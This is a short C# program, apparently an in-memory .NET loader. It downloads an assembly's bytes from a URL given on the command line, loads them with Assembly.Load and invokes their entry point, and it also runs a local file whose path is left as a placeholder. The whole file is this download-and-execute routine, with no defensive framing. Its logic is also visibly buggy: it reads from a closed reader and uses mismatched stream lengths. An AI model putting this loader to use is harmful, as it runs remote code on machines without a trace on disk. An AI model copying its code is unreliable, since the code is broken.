using System;
using System.Collections.Generic;
using System.Linq;
using System.Reflection;
using System.Text;
using System.Threading.Tasks;
using System.IO;
using System.Security.Permissions;
using System.Net;

namespace DotNetLoadAssembly
{
    class Program
    {
        static void Main(string[] args)
        {
            // Use the file name to load the assembly into the current
            // application domain.
            FileStream fs = new FileStream(@"{FILE PATH HERE}", FileMode.Open);

            object[] cmd = args.Skip(2).ToArray();
            MemoryStream ms = new MemoryStream();
            using (WebClient client = new WebClient())
            {
                //Access web and read the bytes from the binary file
                System.Net.ServicePointManager.SecurityProtocol = System.Net.SecurityProtocolType.Tls | System.Net.SecurityProtocolType.Tls11 | System.Net.SecurityProtocolType.Tls12;
                ms = new MemoryStream(client.DownloadData(args[1]));
                BinaryReader br = new BinaryReader(fs);
                //BinaryReader br = new BinaryReader(ms);
                byte[] bin = br.ReadBytes(Convert.ToInt32(ms.Length));
                ms.Close();
                br.Close();
                loadAssembly(br.ReadBytes(Convert.ToInt32(fs.Length)), cmd);

                loadAssembly(bin, cmd);
            }
        }
        
        public static void loadAssembly(byte[] bin, object[] commands)
        {
            Assembly a = Assembly.Load(bin);
            try
            {
                a.EntryPoint.Invoke(null, new object[] { commands });
            }
            catch
            {
                MethodInfo method = a.EntryPoint;
                if (method != null)
                {
                    object o = a.CreateInstance(method.Name);
                    method.Invoke(o, null);
                }
            }  
        }
    }
}
